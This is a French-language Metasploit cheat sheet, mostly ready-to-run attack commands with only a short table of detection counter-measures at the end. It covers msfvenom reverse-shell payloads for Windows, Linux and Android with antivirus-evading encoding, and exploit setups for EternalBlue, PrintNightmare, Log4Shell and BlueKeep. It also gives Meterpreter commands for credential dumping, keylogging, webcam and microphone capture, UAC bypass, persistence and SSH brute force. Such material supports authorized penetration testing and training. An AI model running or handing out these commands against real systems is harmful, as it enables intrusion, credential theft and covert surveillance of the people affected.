---
title: "Metasploit Framework"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > Web Security"
tags: [sciences-appliquées, informatique, sécurité]
date: "2025-02-15"
---

# Metasploit Framework

Metasploit est le framework de test d'intrusion le plus utilisé au monde. Il centralise les exploits, payloads, et outils de post-exploitation en une interface unifiée.

## Architecture

```
msfconsole (CLI)
    ├── Exploits          ← Exploite une vulnérabilité
    ├── Payloads          ← Code exécuté après exploitation
    │   ├── Singles       (autonomes, ex: add user)
    │   ├── Stagers       (établit connexion)
    │   └── Stages        (chargé via stager : Meterpreter, shell)
    ├── Auxiliary         ← Scanner, bruteforce, sniffers
    ├── Post              ← Post-exploitation (collecte, persistence)
    ├── Encoders          ← Obfusquer les payloads
    └── Evasion           ← Contourner AV/EDR
```

## Navigation dans msfconsole

```bash
# Démarrer
msfconsole
msfconsole -q  # Sans la bannière

# Navigation
help            # Aide générale
help <commande> # Aide sur une commande spécifique
search <terme>  # Chercher un module
use <module>    # Charger un module
info            # Infos sur le module chargé
options         # Options du module
show payloads   # Payloads compatibles
show targets    # Cibles supportées
back            # Retour au prompt principal
exit            # Quitter

# Historique et shells
history                # Historique des commandes
shell                  # Shell système local
```

## Recherche et sélection de modules

```bash
# Rechercher par CVE
search cve:2021-44228       # Log4Shell
search cve:2017-0144        # EternalBlue (MS17-010)
search cve:2021-34527       # PrintNightmare

# Rechercher par mot-clé
search eternal
search type:exploit platform:windows ssh
search smb

# Voir les infos d'un module
info exploit/windows/smb/ms17_010_eternalblue

# Charger et configurer
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 192.168.1.100
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run   # ou exploit
```

## Options communes

| Option | Description |
|--------|-------------|
| RHOSTS | IP(s) cible(s) |
| RHOST | IP cible (singulier) |
| RPORT | Port cible |
| LHOST | IP de l'attaquant (pour reverse shells) |
| LPORT | Port d'écoute de l'attaquant |
| THREADS | Nombre de threads (pour scanners) |
| USERNAME | Nom d'utilisateur (bruteforce) |
| PASSWORD | Mot de passe |
| PAYLOAD | Payload à utiliser |
| TARGET | Cible spécifique (version OS/service) |

```bash
# Configurer plusieurs cibles
set RHOSTS 192.168.1.1-254
set RHOSTS 192.168.1.0/24
set RHOSTS file:/tmp/hosts.txt

# Variables globales (pour tous les modules)
setg LHOST 192.168.1.100
setg LPORT 4444
```

## Payloads

### Types de connexion

**Reverse shell** (recommandé — contourne les firewalls entrants) :
```
Cible → Attaquant
```

**Bind shell** (attaquant se connecte à la cible) :
```
Attaquant → Cible
```

### Payloads courants

```bash
# Reverse TCP Meterpreter (Windows 64-bit)
windows/x64/meterpreter/reverse_tcp

# Reverse HTTPS Meterpreter (chiffré, contourne IDS)
windows/x64/meterpreter/reverse_https

# Reverse TCP Shell (simple)
windows/x64/shell/reverse_tcp

# Linux
linux/x64/meterpreter/reverse_tcp
linux/x86/shell/reverse_tcp

# Android
android/meterpreter/reverse_tcp

# Stageless (tout en un — plus grand mais plus fiable)
windows/x64/meterpreter_reverse_tcp  # Notez l'underscore (pas /)
linux/x64/meterpreter_reverse_tcp
```

### Générer des payloads avec msfvenom

```bash
# Executable Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f exe -o payload.exe

# DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f dll -o malicious.dll

# Script PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f ps1 -o payload.ps1

# ELF Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f elf -o payload

# APK Android
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -o app.apk

# Shellcode Python (pour injection)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f python

# Avec encodeur (anti-AV basique)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -e x64/xor_dynamic -i 5 \
    -f exe -o encoded_payload.exe
```

### Handler multi-handler (écouter les connexions)

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false  # Ne pas arrêter après une connexion
run -j  # Job en arrière-plan

# Voir les jobs
jobs
# Voir les sessions ouvertes
sessions
# Interagir avec une session
sessions -i 1
```

## Meterpreter — Référence des commandes

Meterpreter est un shell avancé en mémoire, indétectable sur disque.

### Système

```bash
# Informations système
sysinfo          # OS, hostname, architecture
getuid           # Utilisateur actuel
getpid           # PID du processus
ps               # Liste des processus
kill 1234        # Tuer un processus
shell            # Shell CMD/bash natif

# Chemin et fichiers
pwd              # Répertoire courant
ls               # Lister fichiers
cd C:\\Users     # Changer de répertoire
cat file.txt     # Lire un fichier
download /path/to/file /local/dest  # Télécharger
upload /local/file C:\\target\\path  # Uploader
search -f *.txt -d C:\\Users        # Chercher des fichiers
```

### Escalade de privilèges

```bash
# Vérifier les privilèges
getprivs         # Privilèges actuels
getsystem        # Tentative automatique d'escalade

# Techniques d'escalade
getsystem -t 1   # Named pipe impersonation (SeImpersonatePrivilege)
getsystem -t 2   # Token duplication
getsystem -t 3   # Reflective DLL injection

# Bypasser UAC
use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_fodhelper

# Lister les tokens disponibles
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
```

### Pivoting et réseau

```bash
# Voir les interfaces réseau
ipconfig
arp               # Table ARP

# Route (pour accéder au réseau interne via la session)
route add 10.10.10.0/24 1  # 1 = session ID
route print

# Proxy SOCKS (pour proxychains)
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j
# Puis : proxychains nmap -sT 10.10.10.0/24

# Port forwarding local
portfwd add -l 3389 -p 3389 -r 10.10.10.10  # RDP interne via notre port 3389
portfwd list
```

### Capture et surveillance

```bash
# Capturer des screenshots
screenshot
# Flux vidéo
use espia  # ou : load espia ; screengrab
run post/multi/manage/shell_to_meterpreter

# Keylogger
keyscan_start
keyscan_dump
keyscan_stop

# Webcam
webcam_list
webcam_snap     # Photo
webcam_stream   # Stream

# Microphone
record_mic -d 10  # 10 secondes
```

### Post-exploitation Windows

```bash
# Hashdump (requires SYSTEM)
hashdump   # Dump SAM database hashes

# Secrets LSA
run post/windows/gather/credentials/credential_collector

# Module Kiwi (Mimikatz intégré)
load kiwi
creds_all         # Toutes les credentials
lsa_dump_sam      # Hashes SAM
lsa_dump_secrets  # Secrets LSA
creds_msv         # NTLM hashes en mémoire
creds_kerberos    # Tickets Kerberos

# Informations AD
run post/windows/gather/enum_ad_users
run post/windows/gather/enum_domain

# Rechercher des fichiers sensibles
run post/windows/gather/enum_files EXTENSIONS=txt,pdf,docx,xlsx SEARCH_USER=true
```

### Persistence

```bash
# Service Windows
run post/windows/manage/persistence_exe STARTUP=SERVICE EXEC_DELAY=0

# Registry Run Key
run post/windows/manage/persistence STARTUP=REGISTRY

# Tâche planifiée
run post/windows/manage/persistence STARTUP=SCHEDULER

# Via cron (Linux)
run post/linux/manage/cron_persistence
```

## Exploits courants

### EternalBlue (MS17-010 — SMBv1)

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
run

# Scanner pour trouver les cibles vulnérables
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run
```

### PrintNightmare (CVE-2021-34527)

```bash
use exploit/windows/dcerpc/cve_2021_1675_printspooler
set RHOSTS 192.168.1.10
set SMBUser administrator
set SMBPass password123
run
```

### Log4Shell (CVE-2021-44228)

```bash
use exploit/multi/http/log4shell_header_injection
set RHOSTS 192.168.1.10
set RPORT 8080
set LHOST 192.168.1.100
set PAYLOAD java/meterpreter/reverse_tcp
run
```

### Bluekeep (CVE-2019-0708 — RDP)

```bash
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.10
set TARGET 1   # Sélectionner la bonne cible Windows
run
```

## Modules Auxiliary (sans exploitation)

```bash
# Scan SMB
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# Brute force SSH
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.10
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
run

# Brute force HTTP login
use auxiliary/scanner/http/http_login
set RHOSTS 192.168.1.10
set AUTH_URI /admin/login
run

# SNMP enumeration
use auxiliary/scanner/snmp/snmp_login
set RHOSTS 192.168.1.0/24
run

# Scanner de vulnérabilités web
use auxiliary/scanner/http/http_put
use auxiliary/scanner/http/dir_scanner
```

## Gestion de la base de données

```bash
# Démarrer PostgreSQL
systemctl start postgresql
msfdb init

# Dans msfconsole
db_status
db_connect        # Se connecter à la DB
workspace         # Lister les workspaces
workspace -a test # Créer un workspace
hosts             # Hôtes découverts
services          # Services identifiés
vulns             # Vulnérabilités trouvées
creds             # Credentials collectées

# Importer des résultats Nmap
db_import /tmp/scan.xml
nmap -sV -oX /tmp/scan.xml 192.168.1.0/24
db_import /tmp/scan.xml
```

## Resource Scripts

Automatiser des séquences de commandes :

```bash
# Créer un script
cat > /tmp/setup.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
run -j
EOF

# Exécuter
msfconsole -r /tmp/setup.rc
# Ou dans msfconsole :
resource /tmp/setup.rc
```

## Contremesures défensives

| Vecteur Metasploit | Détection |
|-------------------|-----------|
| EternalBlue | Détecter `trans2` + `trans2_request` en SMB ; patcher MS17-010 |
| Meterpreter in-memory | EDR avec détection comportementale ; surveiller `CreateRemoteThread` |
| Reverse shells | Connexions sortantes sur ports inhabituels (4444, 4445) |
| Staged payloads | Téléchargement PE/shellcode depuis l'attaquant |
| `getsystem` | `SeImpersonatePrivilege` sur des comptes non-service |
| `hashdump` | Accès à LSASS ; Event 4688 avec lsass comme target |
| Persistence | Nouveaux services (Event 7045), Run keys (Event 4657) |
